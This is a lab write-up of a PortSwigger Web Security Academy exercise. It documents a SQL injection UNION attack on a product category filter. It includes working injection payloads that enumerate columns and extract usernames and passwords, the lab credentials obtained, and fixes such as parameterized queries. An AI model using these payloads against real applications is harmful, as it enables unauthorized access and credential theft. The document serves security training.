**SQL Injection UNION Attack Lab Report**
**PortSwigger Web Security Academy**

1. Executive Summary
This report documents a SQL injection vulnerability exploitation using UNION attacks in the PortSwigger lab. The vulnerability in the product category filter allows unauthorized access to database contents through unsanitized user input. With a CVSS rating of 8.5 (High), this vulnerability enables credential theft, leading to account takeover and unauthorized data access. The successful extraction of administrator credentials demonstrates the critical business impact of this vulnerability.

2. Technical Discovery & Vulnerability Details
Initial Discovery Process
The vulnerability was identified in the category parameter of the product filter URL:
![image](https://github.com/user-attachments/assets/7d515620-87e6-4605-910f-aebc752fda1c)


The application exhibited SQL error behavior when appending a single quote to the parameter.

Technical Explanation
The vulnerable query structure likely resembles:
sqlSELECT product_name, product_description FROM products WHERE category = 'USER_INPUT'
Testing revealed a two-column result set with string data compatibility, allowing for UNION-based extraction of data from other tables.

SQL Injection Patterns Used
Column Enumeration: Corporate+gifts' UNION SELECT NULL,NULL--
Data Type Testing: Clothing%2c+shoes+and+accessories' UNION SELECT 'abc','def'--
Data Extraction: Clothing%2c+shoes+and+accessories' UNION SELECT username, password FROM users--
<img width="604" alt="image" src="https://github.com/user-attachments/assets/d8c1091b-70eb-4511-bbb4-0565556a35f6" />


3. Exploitation Proof-of-Concept
Step-by-Step Reproduction

Setup: Configure Burp Suite as browser proxy with interception enabled
Column Count: Inject ' UNION SELECT NULL,NULL-- to determine the result set has two columns
Data Type Testing: Inject ' UNION SELECT 'abc','def'-- to confirm string compatibility
Credential Extraction: Inject ' UNION SELECT username, password FROM users-- to extract credentials
Authentication: Log in as administrator using the extracted credentials
<img width="1512" alt="image" src="https://github.com/user-attachments/assets/944acbcd-7ac5-4321-af43-a12409476351" />


Data Extracted

Administrator: administrator:kzh4w8e4iroc6p2zass6
Other accounts:

wiener:kib42bk2zu3ma5zse9u2
carlos:zkhfl75kar8xrro784l0
<img width="593" alt="image" src="https://github.com/user-attachments/assets/13c09268-c476-46ab-8a24-1004d5df5f7f" />
<img width="579" alt="image" src="https://github.com/user-attachments/assets/98537fc4-1c26-4b9f-991f-3a0e57d9dc8c" />



Root Cause Analysis

Direct incorporation of user input into SQL queries without sanitization
String concatenation instead of parameterized queries
Excessive database privileges allowing access to sensitive tables

4. Remediation Recommendations
Code Fixes

Use Parameterized Queries:
javaString query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, userInput);

Input Validation:
javaif (!Pattern.matches("^[a-zA-Z\\s]+$", userInput)) {
    throw new IllegalArgumentException("Invalid category");
}


Defense-in-Depth Strategies

Implement least privilege principle for database access
Deploy a Web Application Firewall (WAF)
Implement proper error handling to prevent information leakage
Conduct regular security assessments and code reviews

5. Real-world Context
SQL injection vulnerabilities remain prevalent and high-impact:

Featured in OWASP Top 10 (2021) as A03: Injection
Responsible for major breaches at Equifax (2017) and Yahoo (2012)
Approximately 27% of web applications contain at least one SQL injection flaw

Production impact includes:

Unauthorized data access
Account takeover
Potential data modification or destruction
Regulatory compliance violations (GDPR, PCI DSS)
Reputational damage and loss of customer trust

The relative ease of exploitation coupled with the severe potential impact makes SQL injection a critical vulnerability requiring immediate remediation.
